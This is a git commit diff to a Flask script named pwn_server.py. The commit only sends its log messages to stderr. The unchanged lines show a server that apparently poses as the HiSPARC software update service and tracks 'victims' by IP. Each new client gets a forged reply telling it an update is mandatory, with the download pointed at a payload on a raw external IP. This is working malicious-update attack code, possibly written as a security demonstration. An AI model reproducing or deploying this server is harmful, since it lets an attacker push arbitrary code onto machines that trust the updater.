8c843a82909262056937050188095563fc4923bd
Tom Kooij <tomkooij@tomkooij.nl>
2019-01-31 12:01:29 +0100

    print to stderr
    print outputs to console, which can be badly 'synced' on *nix.

--- pwn_server.py
+++ pwn_server.py
@@ -1,4 +1,6 @@
 import os
+import sys
+
 from flask import Flask
 from flask import request
 
@@ -20,19 +22,19 @@ def hello_world():
 def show_update(subpath):
     try:
         remote_ip = request.remote_addr
-        print(f'Victim in trap: {remote_ip}')
+        print(f'Victim in trap: {remote_ip}', file=sys.stderr)
         flag_fn = 'victim_%s' % remote_ip
         if not os.path.exists(flag_fn):
             # flag does not exist: New victim!
-            print(f'*********** New victim! {remote_ip}')
+            print(f'*********** New victim! {remote_ip}', file=sys.stderr)
             with open(flag_fn, 'w') as f:
                 f.write('foobar!')
             return f'newVersionUser=14&mustUpdate=1&urlUser=http://77.175.129.123/{PAYLOAD}'
         else:
-            print(f'Not messing with old victim! {remote_ip}')
+            print(f'Not messing with old victim! {remote_ip}', file=sys.stderr)
             return 'mustUpdate=0'
     except Exception as e:
         # HiSPARC updater will crash (halt) on broken HTTP reply,
         # so if all fails at least return 'mustUpdate=0'
-        print('**ERROR*** Exception:', e)
+        print('**ERROR*** Exception:', e, file=sys.stderr)
         return 'mustUpdate=0'
